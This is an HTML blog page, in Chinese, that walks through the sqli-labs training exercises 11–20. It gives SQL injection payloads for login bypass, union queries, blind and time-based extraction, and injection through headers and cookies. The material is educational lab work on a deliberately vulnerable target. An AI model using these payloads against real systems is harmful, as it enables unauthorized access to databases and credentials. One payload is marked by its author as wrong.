@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="google-site-verification" content="TZE0rZyIqLl10trYu3BWBWa1Vmz6HFwhb2OcNEK4u-s" />
+     <link rel="shortcut icon" href= /img/favicon.ico >
+    <title>
+        Hexo
+    </title>
+    <meta name="description" content= 嘿，我是刘训灼～这是我的子站，用于展示写的Hexo主题：Coder。欢迎访问！ >
+    <meta name="keywords" content= Blog,Hexo,Theme,刘训灼,LiuXunzhuo >
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-home
+ replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            sql-labs（less11-20）
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <h1 id="sql-labs（less11-20）"><a href="#sql-labs（less11-20）" class="headerlink" title="sql-labs（less11-20）"></a>sql-labs（less11-20）</h1><h2 id="Less11"><a href="#Less11" class="headerlink" title="Less11"></a>Less11</h2><p>从这一关开始，要开始学习post注入了</p>
+<p>post就是：</p>
+<p>数据从客户端提交到服务器端，例如我们在登录过程中，输入用户名和密码，用户名和密码以表单的形式提交，提交到服务器后服务器再进行验证。这就是一次 post 的过程的</p>
+<p>输入</p>
+<p>Username:admin‘</p>
+<p>Password:123</p>
+<p>出现了熟悉的报错</p>
+<p><img src="/2020/11/28/sql-labs%EF%BC%88less11-20%EF%BC%89/Less11-1.png" alt="Less11-1"></p>
+<p>可以看出，是多加的 ’ 破坏了查询。</p>
+<p>现在试试注释掉后面的密码，能不能使得sql查询返回真</p>
+<p>输入</p>
+<p>Username:admin‘#</p>
+<p>Password:123(随便输入)</p>
+<p>发现成功登陆了</p>
+<p>看来是  ‘  构造了admin的闭合，如何注释了后面的代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE username&#x3D;&#39;admin&#39;#&#39; and password&#x3D;&#39;123&#39; LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<p>接下来使用order by 看看有几个字段</p>
+<p>使用admin’ or 1=2 order by 3#</p>
+<p>返回正常。</p>
+<p>使用返回错误，可以知道有两个字段。</p>
+<p>接下来使用union select联合查询</p>
+<p>使用adminc’ union select 1，database()# 查询数据库名（admin是不存在，否则会正常返回admin的数据）<img src="/2020/11/28/sql-labs%EF%BC%88less11-20%EF%BC%89/Less11-2.png" alt="Less11-2"></p>
+<h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>这关和less-11类似，</p>
+<p>输入：</p>
+<p>​    username：admin’</p>
+<p>​    password:    123(随便输入)</p>
+<p>发现没有报错</p>
+<p>输入：</p>
+<p>​    username：admin”</p>
+<p>​    password:    123(随便输入)</p>
+<p>得<img src="/2020/11/28/sql-labs%EF%BC%88less11-20%EF%BC%89/Less12-1.png" alt="Less12-1">到报错</p>
+<p>可以看到对id进行了(“id”)的处理</p>
+<p>输入</p>
+<p>​    username:    admin”)#</p>
+<p>​    password:    123(随便输入)</p>
+<p>成功以admin登入</p>
+<p>使用order by 查看字段得知有两个字段。</p>
+<p>union注入和Less-11相同，使用 “) 闭合即可 </p>
+<h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p>输入：</p>
+<p>​    username：admin’</p>
+<p>​    password:    123(随便输入)</p>
+<p>发现报错</p>
+<p><img src="/2020/11/28/sql-labs%EF%BC%88less11-20%EF%BC%89/Less13-1.png" alt="Less13-1"></p>
+<p>是对id参数进行了 (‘’)的处理</p>
+<p>输入：</p>
+<p>​    username：admin’)#</p>
+<p>​    password:    123(随便输入)</p>
+<p>成功登入</p>
+<p>但是发生这里登入成功不会提供数据信息，只有提示成功登入而已</p>
+<p>那么就要使用盲注了</p>
+<p>布尔型盲注</p>
+<p>猜数据库第一位</p>
+<p>admin’) and left(database(),1)&gt;’a’#</p>
+<p>得到正确返回</p>
+<p><img src="/2020/11/28/sql-labs%EF%BC%88less11-20%EF%BC%89/Less13-2.png" alt="Less13-2"></p>
+<p>这关是要求双查询注入</p>
+<p>双查询</p>
+<p>获取数据库名字</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin1&#39;) union select count(*),concat((select database()),floor(rand()*2) as a from information_schema.tables group by a#passwd&#x3D;123&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
+
+<p>(误)</p>
+<h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>与less-13一样</p>
+<p>只是对于id参数的处理变成了 “</p>
+<p>简单的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&quot;and left(database(),1)&gt;&#39;p&#39;#&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
+
+<p>登入成功</p>
+<h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><p>这关没有错误信息的提示，只能靠猜测对于的id参数的处理。</p>
+<p><img src="/2020/11/28/sql-labs%EF%BC%88less11-20%EF%BC%89/Less15-1.png" alt="Less15-1"></p>
+<p>通过源代码看出对于id参数的处理是 ‘’</p>
+<p>使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin‘ or 1&#x3D;1 # </span><br></pre></td></tr></table></figure>
+
+<p>进行注入</p>
+<p>基于bool时间报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39;or if(ascii(substr((select table_name from information_schema.tables where database() limit 0,1),1,1))&#x3D;120,1,sleep(9))#&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/28/sql-labs%EF%BC%88less11-20%EF%BC%89/Less-15-2.png" alt="Less-15-2"></p>
+<h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>和less15相同</p>
+<p>从源码看出对于id参数进行 (“id”) 处理</p>
+<h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>这关开始使用到增删改，前面所用的都是查（select）</p>
+<p>标题就是</p>
+<p>​    Updata Query - Error based - String</p>
+<p>显然就是要updata</p>
+<p>首先输入</p>
+<p>​    username： admin</p>
+<p>​    new password： admin</p>
+<p><img src="/2020/11/28/sql-labs%EF%BC%88less11-20%EF%BC%89/Less-17-1.png" alt="Less-17-1"></p>
+<p>可以看到，提示说：成功修改了你的密码</p>
+<p>看来这关就是修改密码的过程</p>
+<p>这里的username被处理过，需要输入正确的userna，可以使用admin。</p>
+<p>所以选择password进行注入</p>
+<p>尝试输入：</p>
+<p>​    username： admin</p>
+<p>​    passwor：    1’</p>
+<p>返回报错</p>
+<p><img src="/2020/11/28/sql-labs%EF%BC%88less11-20%EF%BC%89/Less-17-2.png" alt="Less-17-2"></p>
+<p>可以看出对于</p>
+<p>密码的参数的处理是 “</p>
+<p>则可以使用 pass ：1’#        注入</p>
+<p>XPATH 错误 查询</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;1&#39;and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1)),1)#&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/28/sql-labs%EF%BC%88less11-20%EF%BC%89/Less-17-3.png" alt="Less-17-3"></p>
+<p>延时注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;1&#39;and if(ascii(substr(database(),1,1))&#x3D;113,1,sleep(10))#&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
+
+<p>正确返回，错误延时。</p>
+<p>在源代码中可以看到一个函数</p>
+<p><img src="/2020/11/28/sql-labs%EF%BC%88less11-20%EF%BC%89/Less-17-4.png" alt="Less-17-4"></p>
+<p>其中的几个函数：</p>
+<ul>
+<li><h4 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes()"></a>addslashes()</h4><p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。<br>预定义字符是：<br> 单引号（’）<br> 双引号（”）<br> 反斜杠（\）<br> NULL<br>提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。<br>注释：默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您<br>不应对已转义过的字符串使用 addslashes()，因为这样会导致双层转义。遇到这种情况时可<br>以使用函数 get_magic_quotes_gpc() 进行检测。</p>
+<p>语法：addslashes(string)</p>
+<p>string 必需。规定要转义的字符串。<br>返回值： 返回已转义的字符串。<br>PHP 版本： 4+</p>
+</li>
+<li><h4 id="stripslashes"><a href="#stripslashes" class="headerlink" title="stripslashes()"></a>stripslashes()</h4><p>函数删除由 addslashes() 函数添加的反斜杠。</p>
+</li>
+<li><h4 id="mysql-real-escape-string"><a href="#mysql-real-escape-string" class="headerlink" title="mysql_real_escape_string()"></a>mysql_real_escape_string()</h4><p>函数转义 SQL 语句中使用的字符串中的特殊字符。<br>下列字符受影响：<br> \x00<br> \n<br> \r<br> <br> ‘<br> “<br> \x1a<br>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。<br>语法：mysql_real_escape_string(string,connection)<br>参数 描述<br>string 必需。规定要转义的字符串。<br>connection 可选。规定 MySQL 连接。如果未规定，则使用上一个连接。<br>说明：本函数将 string 中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用<br>于 mysql_query()。</p>
+</li>
+</ul>
+<p>  <strong>可以看出check_input()中，对 username 进行各种转义的处理，所以不能对username 进行注入。</strong></p>
+<h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><p>这关的username和password都进行上面所说的check_input()的函数处理，无法进行注入。</p>
+<p>在源代码中有insert()</p>
+<p>$insert=”INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘$uagent’,<br>‘$IP’, $uname)”;</p>
+<p>这个函数把ip和useragent插入到书库当中了，对ip地址进行修改不 方便。</p>
+<p>可以尝试使用useragent来入手。</p>
+<p>我使用了firfox商店提供的抓包工具 HTTP Head live 来进行抓包。<img src="/2020/11/28/sql-labs%EF%BC%88less11-20%EF%BC%89/Less-18-1.png" alt="Less-18-1"></p>
+<p>使用ModHead来修改useragent。</p>
+<p>(注意要输入正确的用户名和密码)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; or updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1)),1),&#39;&#39;,&#39;&#39;)#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/28/sql-labs%EF%BC%88less11-20%EF%BC%89/Less-18-2.png" alt="Less-18-2"></p>
+<h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>和less18基本相同，不同是修改referer</p>
+<p>从源代码中获取的是HTTP_REFERER</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; or updatexml(1,concat(0x7e,(database())),1),&#39;&#39;)#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/28/sql-labs%EF%BC%88less11-20%EF%BC%89/Less-19-1.png" alt="Less-19-1"></p>
+<h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><h3 id="cookie："><a href="#cookie：" class="headerlink" title="cookie："></a>cookie：</h3><p><em>GET请求所携带的用户信息，结构为–键,值,时间</em><br><em>网页正确回显依赖数据库对cookie的验证。构造cookie dump</em></p>
+<p>对</p>
+<p>使用Cooki Editor</p>
+<p>修改：</p>
+<p>​        <img src="/2020/11/28/sql-labs%EF%BC%88less11-20%EF%BC%89/Less-20-1.png" alt="Less-20-1"></p>
+<p>再次运行，出现报错</p>
+<p><img src="/2020/11/28/sql-labs%EF%BC%88less11-20%EF%BC%89/Less-20-2.png" alt="Less-20-2"></p>
+<p>可以通过cookie的修改来进行注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;union select 1,2,database()#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/28/sql-labs%EF%BC%88less11-20%EF%BC%89/新建文件夹\blog\source_posts\sql-labs（less11-20）\Less-20-3.png" alt="Less-20-3"></p>
+
+    </div>
+
+    
+        <hr class="fhr">
+        <div id="vcomments"></div>
+    
+</div>
+    <div class="footer" id="footer">
+    <p><h4>版权所有 © 2020 | 作者: ASSIN | 主题 By <a class="theme-author" target="_blank" rel="noopener" href="https://github.com/Xunzhuo/hexo-theme-coder" style="font-size:14px; color: #969696">Coder</a></h4>
+    
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        <span id="busuanzi_container_site_pv">本站浏览总访问量: <span id="busuanzi_value_site_pv"></span></span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_uv">本站访问人数: <span id="busuanzi_value_site_uv"></span></span>
+    
+    <label class="el-switch el-switch-blue el-switch-sm" style="vertical-align: sub;">
+        <input type="checkbox" name="switch" id="update_style">
+        <span class="el-switch-style"></span>
+    </label>
+
+    <!--         <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+    document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script> -->
+</p>
+</div>
+
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="NOsswOncKgc8HOxqo9oxIWlX-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="z1FihjWEbS8uIfUQdmCtK7zz">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+color: #698fca;
+}
+.v .vlist .vcard .vhead .vsys {
+color: #3a3e4a;
+}
+.v .vlist .vcard .vh .vmeta .vat {
+color: #638fd5;
+}
+.v .vlist .vcard .vhead .vnick {
+color: #6ba1ff;
+}
+.v a {
+color: #8696b1;
+}
+.v .vlist .vcard .vhead .vnick:hover {
+color: #669bfc;
+}
+</style>
+    <script type="text/javascript" color="173,174,173" opacity='1' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+</body>
+</html>
